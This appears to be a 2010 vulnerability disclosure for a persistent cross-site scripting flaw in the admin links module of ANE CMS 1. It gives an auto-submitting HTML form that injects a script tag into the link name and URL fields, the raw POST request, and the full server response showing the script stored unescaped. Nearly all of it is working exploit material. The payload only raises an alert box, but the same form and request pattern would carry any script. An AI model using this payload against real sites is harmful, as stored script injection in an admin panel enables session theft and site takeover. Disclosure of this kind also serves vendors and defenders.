@@ -1,0 +1,265 @@
+                                     =======================================================================
+     
+                                                  ANE CMS 1 Persistent XSS Vulnerability
+   
+                                     =======================================================================
+     
+                                                                   by
+     
+                                                              Pratul Agrawal
+   
+     
+     
+  # Vulnerability found in- Admin module
+     
+  # email         Pratulag@yahoo.com
+     
+  # company       aksitservices
+     
+  # Credit by     Pratul Agrawal
+   
+  # Software      ANE CMS 1
+  
+  # Category      CMS / Portals
+  
+  # Plateform     php
+    
+     
+     
+  #   Proof of concept   #
+   
+  Targeted URL:  http://server/acp/index.php?p=cfg&amp;m=links
+    
+   
+  In ADD LINKS Field provide the malicious script to store in the Database.
+ 
+  That is-
+ 
+                      &lt;html&gt;
+ 
+                          &lt;body&gt;
+ 
+                             &lt;form name=&quot;XYZ&quot; action=&quot;http://server/acp/index.php?p=cfg&amp;m=links&amp;id=0&quot; method=&quot;post&quot;&gt;
+ 
+                                    &lt;input type=hidden name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&quot;&gt;
+ 
+                                    &lt;input type=hidden name=&quot;link&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&quot;&gt;
+ 
+                                    &lt;input type=hidden name=&quot;type&quot; value=&quot;1&quot;&gt;
+               
+                                    &lt;input type=hidden name=&quot;view&quot; value=&quot;0&quot;&gt;
+ 
+                             &lt;/form&gt;
+ 
+                               &lt;script&gt;
+ 
+                                 document.XYZ.submit();
+ 
+                               &lt;/script&gt;
+ 
+                          &lt;/body&gt;
+ 
+                        &lt;/html&gt;
+ 
+ 
+  =======================================================================
+  Request -
+  =======================================================================
+  POST /acp/index.php?p=cfg&amp;m=links&amp;id=0 HTTP/1.1
+  Host: server
+  User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-us,en;q=0.5
+  Accept-Encoding: gzip,deflate
+  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+  Keep-Alive: 300
+  Proxy-Connection: keep-alive
+  Referer: http://server/acp/index.php?p=cfg&amp;m=links
+  Cookie: PHPSESSID=200fecb6b36334b983ebe251d11a5df9
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 41
+ 
+  name=&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&amp;link=&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&amp;type=1&amp;view=0
+  
+  =======================================================================
+  =======================================================================
+  Response-
+  =======================================================================
+  HTTP/1.1 200 OK
+  Date: Thu, 11 Mar 2010 06:59:03 GMT
+  Server: Apache/2.2.9 (Debian) mod_ssl/2.2.9 OpenSSL/0.9.8g
+  Expires: Thu, 19 Nov 1981 08:52:00 GMT
+  Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+  Pragma: no-cache
+  Vary: Accept-Encoding
+  Content-Type: text/html; charset: utf-8
+  Content-Length: 7771
+ 
+&amp;#65279;&amp;#65279;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
+&lt;title&gt;Transdmin Light&lt;/title&gt;
+ 
+&lt;!-- CSS --&gt;
+&lt;link href=&quot;./skins/aaa/css/transdmin.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
+&lt;!--[if IE 6]&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;./skins/aaa/css/ie6.css&quot; /&gt;&lt;![endif]--&gt;
+&lt;!--[if IE 7]&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;./skins/aaa/css/ie7.css&quot; /&gt;&lt;![endif]--&gt;
+ 
+&lt;!-- JavaScripts--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://server/system/js/jquery.jgrowl.css&quot; media=&quot;screen&quot;/&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;http://server/system/js/jquery-1.3.2.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://server/system/js/jquery.jgrowl_minimized.js&quot;&gt;&lt;/script&gt;
+&lt;style&gt;div.jGrowl div.green {
+background-color:       #00D400;
+color:                  navy;
+    }&lt;/style&gt;
+&lt;/head&gt;
+ 
+&lt;body&gt;
+     
+    &lt;div id=&quot;wrapper&quot;&gt;
+        &lt;!-- h1 tag stays for the logo, you can use the a tag for linking the index page --&gt;
+        &lt;h1&gt;&lt;a href=&quot;#&quot;&gt;&lt;span&gt;Administration&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;
+ 
+        &lt;!-- You can name the links with lowercase, they will be transformed to uppercase by CSS, we prefered to name them with uppercase to have the same effect with disabled stylesheet --&gt;
+        &lt;ul id=&quot;mainNav&quot;&gt;
+            &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;Dashboard&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a href=&quot;?p=cfg&quot;&gt;Configuration&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a href=&quot;?p=tpl&quot;&gt;Design&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a href=&quot;?p=mod&quot;&gt;Modules&lt;/a&gt;&lt;/li&gt;
+            &lt;li class=&quot;logout&quot;&gt;&lt;a href=&quot;#&quot;&gt;Logout Admin&lt;/a&gt;&lt;/li&gt;
+        &lt;li class=&quot;logout&quot;&gt;&lt;a href=&quot;../index.php&quot;&gt;CMS&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+        &lt;!-- // #end mainNav --&gt;
+ 
+        &lt;div id=&quot;containerHolder&quot;&gt;
+            &lt;div id=&quot;container&quot;&gt;
+    &lt;div id=&quot;sidebar&quot;&gt;
+         
+    &lt;ul class=&quot;sideNav&quot;&gt;
+                                &lt;li&gt;&lt;a href=&quot;?p=cfg&quot;&gt;Show Setting&lt;/a&gt;&lt;/li&gt;
+                                &lt;li&gt;&lt;a href=&quot;?p=cfg&amp;m=mod&quot;&gt;Modify Setting&lt;/a&gt;&lt;/li&gt;
+                                &lt;li&gt;&lt;a href=&quot;?p=cfg&amp;m=links&quot;&gt;Links Management&lt;/a&gt;&lt;/li&gt;
+                                &lt;li&gt;&lt;a href=&quot;?p=cfg&amp;m=reposerver&quot;&gt;Repository Server&lt;/a&gt;&lt;/li&gt;
+                            &lt;/ul&gt;
+         
+    &lt;/div&gt;
+     
+                &lt;h2&gt;&lt;a href=&quot;#&quot;&gt;Configuration&lt;/a&gt; » &lt;a href=&quot;#&quot; class=&quot;active&quot;&gt;Links&lt;/a&gt;&lt;/h2&gt;
+ 
+                &lt;div id=&quot;main&quot;&gt;&lt;br&gt;
+ 
+                &lt;form action=&quot;?p=cfg&amp;m=links&amp;id=0&quot; class=&quot;jNice&quot; method=&quot;POST&quot;&gt;
+ 
+&lt;h3&gt;Aggiungi un nuovo Link&lt;/h3&gt;
+                &lt;fieldset&gt;&lt;p&gt;&lt;label&gt;Nome link:&lt;/label&gt;&lt;input type=&quot;text&quot; class=&quot;text-long&quot; name=&quot;name&quot; value=&quot;&quot;/&gt;&lt;/p&gt;
+                &lt;p&gt;&lt;label&gt;Nome link:&lt;/label&gt;&lt;input type=&quot;text&quot; class=&quot;text-long&quot; name=&quot;link&quot; value=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;label&gt;Tipo Link:&lt;/label&gt;&lt;input type=&quot;radio&quot; name=&quot;type&quot; value=&quot;1&quot; checked&gt;Barra Links &lt;input type=&quot;radio&quot; name=&quot;type&quot; value=&quot;2&quot;&gt;Menu Links&lt;/p&gt;
+ 
+&lt;p&gt;&lt;label&gt;Accesso:&lt;/label&gt;
+                &lt;select name=&quot;view&quot;&gt;
+                        &lt;option value=&quot;0&quot;&gt;Visible only to guests&lt;/option&gt;
+                        &lt;option value=&quot;1&quot;&gt;Visible to all&lt;/option&gt;
+                        &lt;option value=&quot;2&quot;&gt;Visible only to members&lt;/option&gt;
+                        &lt;option value=&quot;3&quot;&gt;Visible only to admins&lt;/option&gt;
+                &lt;/select&gt;
+                &lt;/p&gt;
+                 
+                &lt;input type=&quot;submit&quot; value=&quot;Send&quot; /&gt;
+&lt;/fieldset&gt;
+                        &lt;/form&gt;
+ 
+&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt;
+                &lt;tr&gt;
+                                &lt;td&gt;Name&lt;/td&gt;
+                &lt;td&gt;Link&lt;/td&gt;
+                 
+                                 &lt;td&gt;Options&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;&lt;td colspan=&quot;4&quot;&gt;Bar Links&lt;/td&gt;&lt;/tr&gt;
+                                &lt;tr class=&quot;odd&quot;&gt;
+                                &lt;td&gt;Home&lt;/td&gt;
+                &lt;td&gt;index.php&lt;/td&gt;
+                 
+                &lt;td&gt;&lt;a href=&quot;?p=cfg&amp;m=links&amp;a=modify&amp;id=1&quot;&gt;Modify&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=delete&amp;id=1&quot;&gt;Delete&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=down&amp;id=1&quot;&gt;Move Down&lt;/a&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr class=&quot;odd&quot;&gt;
+                                &lt;td&gt;Blog&lt;/td&gt;
+                &lt;td&gt;blog&lt;/td&gt;
+                 
+                &lt;td&gt;&lt;a href=&quot;?p=cfg&amp;m=links&amp;a=modify&amp;id=2&quot;&gt;Modify&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=delete&amp;id=2&quot;&gt;Delete&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=up&amp;id=2&quot;&gt;Move up&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=down&amp;id=2&quot;&gt;Move Down&lt;/a&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr class=&quot;odd&quot;&gt;
+                                &lt;td&gt;Registrati&lt;/td&gt;
+                &lt;td&gt;register&lt;/td&gt;
+                 
+                &lt;td&gt;&lt;a href=&quot;?p=cfg&amp;m=links&amp;a=modify&amp;id=4&quot;&gt;Modify&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=delete&amp;id=4&quot;&gt;Delete&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=up&amp;id=4&quot;&gt;Move up&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=down&amp;id=4&quot;&gt;Move Down&lt;/a&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr class=&quot;odd&quot;&gt;
+                                &lt;td&gt;ACP&lt;/td&gt;
+                &lt;td&gt;acp&lt;/td&gt;
+                 
+                &lt;td&gt;&lt;a href=&quot;?p=cfg&amp;m=links&amp;a=modify&amp;id=5&quot;&gt;Modify&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=delete&amp;id=5&quot;&gt;Delete&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=up&amp;id=5&quot;&gt;Move up&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=down&amp;id=5&quot;&gt;Move Down&lt;/a&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr class=&quot;odd&quot;&gt;
+                                &lt;td&gt;Widgets&lt;/td&gt;
+                &lt;td&gt;index.php?modifywidgets&lt;/td&gt;
+                 
+                &lt;td&gt;&lt;a href=&quot;?p=cfg&amp;m=links&amp;a=modify&amp;id=6&quot;&gt;Modify&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=delete&amp;id=6&quot;&gt;Delete&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=up&amp;id=6&quot;&gt;Move up&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=down&amp;id=6&quot;&gt;Move Down&lt;/a&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr class=&quot;odd&quot;&gt;
+                                &lt;td&gt;master&lt;/td&gt;
+                &lt;td&gt;master.asp&lt;/td&gt;
+                 
+                &lt;td&gt;&lt;a href=&quot;?p=cfg&amp;m=links&amp;a=modify&amp;id=38&quot;&gt;Modify&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=delete&amp;id=38&quot;&gt;Delete&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=up&amp;id=38&quot;&gt;Move up&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=down&amp;id=38&quot;&gt;Move Down&lt;/a&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr class=&quot;odd&quot;&gt;
+                                &lt;td&gt;&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;/td&gt;
+                &lt;td&gt;&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;/td&gt;
+                 
+                &lt;td&gt;&lt;a href=&quot;?p=cfg&amp;m=links&amp;a=modify&amp;id=39&quot;&gt;Modify&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=delete&amp;id=39&quot;&gt;Delete&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=up&amp;id=39&quot;&gt;Move up&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=down&amp;id=39&quot;&gt;Move Down&lt;/a&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+            &lt;tr&gt;&lt;td colspan=&quot;4&quot;&gt;Menu Links&lt;/td&gt;&lt;/tr&gt;
+                                &lt;tr class=&quot;odd&quot;&gt;
+                                &lt;td&gt;home&lt;/td&gt;
+                &lt;td&gt;index.php&lt;/td&gt;
+                 
+                &lt;td&gt;&lt;a href=&quot;?p=cfg&amp;m=links&amp;a=modify&amp;id=14&quot;&gt;Modify&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=delete&amp;id=14&quot;&gt;Delete&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=up&amp;id=14&quot;&gt;Move up&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=down&amp;id=14&quot;&gt;Move Down&lt;/a&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr class=&quot;odd&quot;&gt;
+                                &lt;td&gt;Blog&lt;/td&gt;
+                &lt;td&gt;blog&lt;/td&gt;
+                 
+                &lt;td&gt;&lt;a href=&quot;?p=cfg&amp;m=links&amp;a=modify&amp;id=19&quot;&gt;Modify&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=delete&amp;id=19&quot;&gt;Delete&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=up&amp;id=19&quot;&gt;Move up&lt;/a&gt; &lt;a href=&quot;?p=cfg&amp;m=links&amp;a=move&amp;type=down&amp;id=19&quot;&gt;Move Down&lt;/a&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                                    &lt;/table&gt;
+&lt;br /&gt;
+&lt;/div&gt;
+ 
+                 
+                &lt;!-- // #main --&gt;
+ 
+                &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
+            &lt;/div&gt;
+            &lt;!-- // #container --&gt;
+        &lt;/div&gt;
+        &lt;!-- // #containerHolder --&gt;
+ 
+        &lt;p id=&quot;footer&quot;&gt;Feel free to use and customize it. &lt;a href=&quot;http://server&quot;&gt;Credit is appreciated.&lt;/a&gt;&lt;/p&gt;
+    &lt;/div&gt;
+    &lt;!-- // #wrapper --&gt;
+     
+                    &lt;script type=&quot;text/javascript&quot;&gt;
+                     $(function()
+            {
+            });&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+ 
+  
+=======================================================================
+  
+  
+   After completion Just Refres the page and the script get executed again and again.
+   
+   
+   #If you have any questions, comments, or concerns, feel free to contact me.
